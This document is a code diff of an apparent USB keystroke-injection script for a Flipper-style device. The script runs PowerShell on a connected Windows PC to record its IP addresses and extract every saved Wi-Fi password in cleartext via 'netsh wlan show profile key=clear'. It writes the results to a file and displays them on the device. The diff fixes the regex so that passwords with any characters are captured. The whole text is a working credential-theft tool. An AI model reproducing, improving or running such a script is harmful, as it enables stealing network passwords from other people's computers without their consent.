@@ -33,8 +33,8 @@ let localFileName = "info.txt";
 
 // Update this script to include the commands you want to run.
 let script = [
-  "Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,SuffixOrigin | where IPAddress -notmatch '(127.0.0.1|169.254.\d+.\d+)' >> " + localFileName + ";",
-  "(netsh wlan show profiles) | Select-String '\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)}  | Select-String 'Key Content\\W+\\:([A-Za-z ]+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$pass}} | Format-Table -AutoSize >> " + localFileName + ";",
+  "Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,SuffixOrigin | where IPAddress -notmatch '(127.0.0.1|169.254.\\d+.\\d+)' >> " + localFileName + ";",
+  "(netsh wlan show profiles) | Select-String '\\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)}  | Select-String 'Key Content\\W+\\:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$pass}} | Format-Table -AutoSize >> " + localFileName + ";",
   // "dir env: >> " + localFileName + ";",
 ];
 
@@ -179,7 +179,7 @@ if (script.length > 0) {
   delay(1000);
   let data = storage.read("/mnt/" + resultFolder + "/" + resultFileName);
   textbox.setConfig("start", "text");
-  textbox.emptyText();
+  textbox.clearText();
   let data_view = Uint8Array(data);
   for (let i = 0; i < data_view.length; i++) {
     textbox.addText(chr(data_view[i]));
@@ -193,7 +193,7 @@ if (script.length > 0) {
   while (textbox.isOpen()) {
     delay(1000);
   }
-  textbox.emptyText();
+  textbox.clearText();
   storage.virtualQuit();
 }
 
